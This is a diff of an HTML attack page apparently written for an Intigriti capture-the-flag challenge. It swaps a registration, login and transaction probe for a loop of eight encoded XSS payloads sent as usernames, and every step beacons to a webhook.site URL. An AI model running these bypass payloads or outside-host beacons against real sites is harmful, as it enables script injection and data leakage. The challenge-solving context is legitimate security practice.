@@ -1,137 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test Username → Nickname Theory</title>
+    <title>XSS Bypass Test - Multiple Payloads</title>
     <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:11px;max-height:400px;overflow-y:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
+    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:11px;max-height:400px;overflow-y:auto;overflow-x:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
 </head>
 <body>
-    <h1>Test: Username → Nickname</h1>
+    <h1>XSS Bypass Test - Multiple Payload Formats</h1>
     <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
-        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/2c5d8307-5b22-4ffe-af23-142d2c0768fb';
-
-        // Simple test username (no XSS)
-        const TEST_USERNAME = `testuser_${Date.now()}`;
+        const WEBHOOK = 'https://webhook.site/b2268d0f-ff42-4033-a952-2a9733379d3a';
 
         let step = 0;
 
-        function log(msg, type = 'info', data = {}) {
+        function log(msg, type = 'info', extra = '') {
             step++;
             const ts = new Date().toLocaleTimeString();
-            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${JSON.stringify(data)}</div>`;
-            console.log(`[${step}] ${msg}`, data);
-            new Image().src = `${WEBHOOK}/?step=${step}&msg=${encodeURIComponent(msg)}&data=${encodeURIComponent(JSON.stringify(data))}&type=${type}&ts=${Date.now()}`;
+            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${extra}</div>`;
+            console.log(`[${step}] ${msg}`, extra);
+            new Image().src = `${WEBHOOK}/?step=${step}&msg=${encodeURIComponent(msg)}&type=${type}&extra=${encodeURIComponent(extra)}&ts=${Date.now()}`;
         }
 
-        async function test() {
+        // Multiple XSS payload formats to test
+        const testPayloads = [
+            {
+                name: 'HTML entities (standard)',
+                payload: 'user&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'
+            },
+            {
+                name: 'Fullwidth Unicode chars',
+                payload: 'user＜img src=x onerror＝＂alert(1)＂＞'  // U+FF1C, U+FF1E, U+FF02
+            },
+            {
+                name: 'Mixed encoding',
+                payload: 'user&lt;img src=x onerror=alert(\'XSS\')&gt;'
+            },
+            {
+                name: 'Without semicolon',
+                payload: 'user&lt;img src=x onerror=alert(1)&gt'
+            },
+            {
+                name: 'Backtick encoded',
+                payload: 'user&lt;img src=x onerror=&grave;alert(1)&grave;&gt;'
+            },
+            {
+                name: 'SVG payload',
+                payload: 'user&lt;svg onload=alert(1)&gt;'
+            },
+            {
+                name: 'Simple tag only',
+                payload: 'user&lt;img src=x&gt;'
+            },
+            {
+                name: 'With forward slash',
+                payload: 'user&lt;img src=x onerror=&quot;alert(1)&quot; /&gt;'
+            },
+        ];
+
+        async function testBypass() {
             try {
-                log('TEST: Does username become nickname?', 'info');
+                log('STARTING XSS BYPASS TEST', 'warning');
 
-                // Step 1: Register with simple username
-                log('Step 1: Registering...', 'info', { username: TEST_USERNAME });
+                for (const test of testPayloads) {
+                    log(`Testing: ${test.name}`, 'info', `Payload: ${test.payload.substring(0, 50)}...`);
 
-                const regResp = await fetch(TARGET + '/api/register', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        username: TEST_USERNAME,
-                        password: 'TestPass123!'
-                    })
-                });
+                    try {
+                        const resp = await fetch(TARGET + '/api/register', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                username: test.payload,
+                                password: 'TestPass123!'
+                            })
+                        });
 
-                const regData = await regResp.json();
-                log('Registration result', regResp.ok ? 'success' : 'error', { status: regResp.status, data: regData });
+                        const data = await resp.json();
+                        const result = resp.ok ? 'SUCCESS' : `FAILED (${resp.status})`;
 
-                if (!regResp.ok) {
-                    log('Registration failed, trying login only...', 'warning');
+                        if (resp.ok) {
+                            log(`✓ ${test.name}: REGISTRATION WORKED!`, 'success', `Username: ${test.payload.substring(0, 30)}`);
+                        } else {
+                            log(`✗ ${test.name}: ${result}`, 'error', data.error || 'Unknown error');
+                        }
+
+                        await new Promise(r => setTimeout(r, 500));
+
+                    } catch (e) {
+                        log(`✗ ${test.name}: NETWORK ERROR`, 'error', e.message);
+                    }
                 }
 
-                // Step 2: Login
-                log('Step 2: Logging in...', 'info');
-
-                const loginResp = await fetch(TARGET + '/api/login', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    credentials: 'include',
-                    body: JSON.stringify({
-                        username: TEST_USERNAME,
-                        password: 'TestPass123!'
-                    })
-                });
-
-                const loginData = await loginResp.json();
-                log('Login result', loginResp.ok ? 'success' : 'error', { status: loginResp.status, data: loginData });
-
-                if (!loginResp.ok) {
-                    log('Login failed!', 'error');
-                    return;
-                }
-
-                // Step 3: Check /api/me to see our user data
-                log('Step 3: Checking /api/me...', 'info');
-
-                const meResp = await fetch(TARGET + '/api/me', { credentials: 'include' });
-                const meData = await meResp.json();
-                log('User data', 'info', { user: meData });
-
-                // Step 4: Make transaction
-                log('Step 4: Making transaction...', 'info');
-
-                const txResp = await fetch(TARGET + '/api/transaction', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    credentials: 'include',
-                    body: JSON.stringify({
-                        toAddress: OUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1
-                    })
-                });
-
-                const txData = await txResp.json();
-                log('Transaction result', txResp.ok ? 'success' : 'error', { status: txResp.status, data: txData });
-
-                // Step 5: Check marketwatch for our transaction
-                log('Step 5: Checking marketwatch...', 'info');
-
-                await new Promise(r => setTimeout(r, 2000));
-
-                const mwResp = await fetch(TARGET + '/api/marketwatch', { credentials: 'include' });
-                const mwData = await mwResp.json();
-
-                // Find our transaction
-                const ourTx = mwData.find(tx => tx.nickname === TEST_USERNAME);
-                log('Marketwatch check', ourTx ? 'success' : 'warning', {
-                    found: !!ourTx,
-                    nickname: ourTx ? ourTx.nickname : 'not found',
-                    all_nicknames: mwData.map(tx => tx.nickname)
-                });
-
-                if (ourTx) {
-                    log('SUCCESS! Username becomes nickname! XSS should work with HTML entities!', 'success');
-                    log('Next: Try HTML entity XSS payload in username', 'warning');
-                } else {
-                    log('Username NOT in nickname. Need different approach.', 'error');
-                }
-
-                // Redirect to marketwatch to visually verify
-                setTimeout(() => {
-                    log('Redirecting to marketwatch.html...', 'info');
-                    window.location.href = TARGET + '/marketwatch.html';
-                }, 3000);
+                log('TEST COMPLETE. Check results above.', 'info');
+                log('If any registration succeeded, that payload bypasses validation!', 'warning');
 
             } catch (error) {
-                log('ERROR', 'error', { error: error.message, stack: error.stack });
+                log('FATAL ERROR', 'error', error.message);
             }
         }
 
         window.addEventListener('load', () => {
-            log('Starting test...', 'info');
-            setTimeout(test, 500);
+            log('Page loaded, starting bypass test...', 'info');
+            setTimeout(testBypass, 500);
         });
     </script>
 </body>
